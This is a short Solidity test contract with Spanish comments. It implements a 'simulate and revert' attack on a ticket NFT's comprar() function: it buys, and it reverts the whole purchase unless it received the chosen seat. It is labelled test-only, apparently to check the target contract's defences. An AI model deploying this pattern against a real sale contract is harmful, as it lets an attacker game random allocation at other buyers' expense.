// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/* ================================================================
 *  AtacanteCompra — SOLO PARA TESTS. No se despliega.
 *
 *  Reproduce el ataque "simular y revertir" contra Entrada.comprar():
 *  compra y, si no le tocó el asiento que quiere, revierte toda la
 *  transacción (la compra y el pago se deshacen; solo pierde el gas)
 *  para volver a intentar en otro bloque.
 * ================================================================ */

interface IEntradaAtacada {
    function comprar() external payable;
    function ownerOf(uint256 tokenId) external view returns (address);
}

contract AtacanteCompra {
    IEntradaAtacada public immutable entrada;

    constructor(address entrada_) {
        entrada = IEntradaAtacada(entrada_);
    }

    /// @notice Compra y se queda la entrada solo si es `objetivo`.
    function atacar(uint256 objetivo) external payable {
        entrada.comprar{value: msg.value}();
        if (entrada.ownerOf(objetivo) != address(this)) {
            revert("No toco el asiento elegido");
        }
    }
}
